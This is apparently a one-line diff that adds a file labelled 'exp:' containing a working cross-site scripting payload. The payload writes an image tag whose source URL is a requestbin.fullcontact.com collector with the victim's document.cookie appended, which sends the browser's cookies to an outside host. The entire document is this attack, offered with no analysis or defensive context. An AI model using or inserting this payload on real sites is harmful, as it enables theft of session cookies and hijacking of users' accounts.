@@ -1,0 +1,1 @@
+exp:<script>document.write("<img src=http://requestbin.fullcontact.com/qnwgrmqn?tk="+document.cookie+" />");</script>
